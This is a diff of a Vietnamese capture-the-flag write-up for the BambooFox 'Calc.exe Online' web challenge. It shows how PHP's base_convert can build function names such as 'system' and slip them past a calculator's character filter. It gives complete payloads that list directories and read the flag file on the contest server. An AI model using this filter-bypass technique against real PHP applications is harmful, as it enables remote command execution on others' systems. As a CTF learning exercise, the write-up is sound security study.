@@ -1,16 +1,16 @@
 # write up
-
+Chall: http://chall.ctf.bamboofox.tw:13377/
+Source: https://github.com/rimc2t/write-up-cho-vui/blob/main/BambooFox-CTF/%5BWeb%5D%20Calc.exe%20Online/source.php
 Cùng nhìn tổng quan đề bài 1 xíu nhé!!!!
 
 ## Overview
 
 ![hinh1](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139404612_1360916280927703_9149939801016827697_n.png?_nc_cat=110&ccb=2&_nc_sid=730e14&_nc_ohc=ve9-OBZQPt4AX9JueT5&_nc_ht=scontent.fsgn2-6.fna&oh=0f8e721f4bf481312e71ad7a610e3cb4&oe=6028F116)
 
-Thử 1 + 1 luôn nè:
-![hinh2](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/138392989_1360916974260967_8395375810784679055_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=EWUewqiBbZMAX9M0w94&_nc_ht=scontent.fsgn2-6.fna&oh=e3878beb6b18d7a875568c93e63a0621&oe=6029ECD3)
-
 Ctr+U coi đi kiếm source xíu. Ồ cho file source nè:
+
 ![hinh3](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/138395872_1360917480927583_7950565622394537985_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=HMV2LUg9jkUAX8eqRtb&_nc_ht=scontent.fsgn2-6.fna&oh=37fd2f612f637ea1f216aa900d2adc8c&oe=602818A5)
+
 ![hinh4](https://scontent.fsgn2-1.fna.fbcdn.net/v/t1.0-9/139774578_1360918004260864_8841010992383322256_o.png?_nc_cat=105&ccb=2&_nc_sid=730e14&_nc_ohc=uMDLxnc9iB8AX-A8RBK&_nc_ht=scontent.fsgn2-1.fna&oh=7adcceb4a7de133adbc823381609fe69&oe=6027AA47)
 
 Nào như mọi lần tui bắt đầu đi đọc code và kết luận vài dòng:
@@ -33,9 +33,13 @@ Lúc đầu đi tìm thì mình thấy 1 vài hàm như **dechex** **decoct** th
 Một hồi mình nhìn kỹ xíu nữa thì thấy 1 hàm **base_convert**, hehe nghe xịn mình liền lên w3school tìm hướng dẫn sử dụng (tại w3 có chỗ debug luôn nên mình ưu tiên).
 
 ![hinh5](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139701687_1360932737592724_2820394334159202042_n.png?_nc_cat=100&ccb=2&_nc_sid=730e14&_nc_ohc=HND36JbcqNYAX_Rhwq7&_nc_ht=scontent.fsgn2-6.fna&oh=ddfb680eaf96e04f88bb9ba9b463eed4&oe=6027B6DF)
+
 ![hinh6](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139477082_1360935034259161_5270276016675269189_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=yYgHu-x5GasAX9knpwh&_nc_ht=scontent.fsgn2-3.fna&oh=98630cfbf2d6a09f6fb8def9ee4edaf9&oe=60291091)
+
 Thử chuyển hệ 36 sang hệ 10 luôn nè:
+
 ![hinh7](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139718552_1360935947592403_3256650028083666150_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=mLDYAutpJscAX_No6zB&_nc_ht=scontent.fsgn2-3.fna&oh=93b0061201edcfdda66df394016cf1c4&oe=6029D635)
+
 Hehe boizzz, ngonnnnn
 
 >Sau khi đã tìm được hồ cá, lượm được cần câu. Giờ phải dùng kỹ năng đi câu hoyyyyyyyyy
@@ -49,7 +53,9 @@ Quay lại với hình 1 nhé, coi lại chỗ để nhập phép tính. Trong �
 >ls:						    base_convert(784,10,36)
 >**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36))**
 Sau đó sẽ trả về kết quả:
+
 ![hinh8](https://scontent.fsgn2-3.fna.fbcdn.net/v/t1.0-9/139471146_1360942944258370_7846989612733427119_n.png?_nc_cat=106&ccb=2&_nc_sid=730e14&_nc_ohc=x7CD47HUc1kAX85inpR&_nc_ht=scontent.fsgn2-3.fna&oh=d451023b8209c672721204c1e1177bbd&oe=6026CED9)
+
 Ò ở đây chỉ có index chứ hong có flag :(
 Mình đi ra thư mục gốc xem thử có flag ngoài đó hong
 
@@ -62,7 +68,9 @@ Mình tìm mọi cách và được chỉ dẫn đến sử dụng **ord** để
 >/:                 base_convert(16191,10,36)(47)
 >**PAYLOAD: base_convert(1751504350,10,36)(base_convert(784,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47))**
 Nhận ngay kết quả: 
+
 ![hinh9](https://scontent.fsgn2-4.fna.fbcdn.net/v/t1.0-9/137328100_1360948444257820_2551682331755669394_n.png?_nc_cat=101&ccb=2&_nc_sid=730e14&_nc_ohc=LNzI_tUCEPsAX9gLo1d&_nc_ht=scontent.fsgn2-4.fna&oh=113d5590d5f2fa6155970803f6328907&oe=60294521)
+
 Á à thì ra flag nằm ngày đây: **flag_a2647e5eb8e9e767fe298aa012a49b50**
 Giờ thì mình mở ra xem hoyyyyy
 
@@ -85,6 +93,7 @@ Giờ chỉ cần ghép lại tất cả để có payload chính xác:
 >>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)) **
 
 Hơi dài nhưng chỉ 405chars vẫn thỏa < 1024 của đề bài. Cuối cùng nhận được kết quả:
+
 ![hinh10](https://scontent.fsgn2-6.fna.fbcdn.net/v/t1.0-9/139449877_1360956844256980_5107937802172987774_n.png?_nc_cat=110&ccb=2&_nc_sid=730e14&_nc_ohc=c2LKQLlWJnwAX8XJqRI&_nc_ht=scontent.fsgn2-6.fna&oh=652d2a0cf660532758b0dfc732742e23&oe=60277931)
 
 
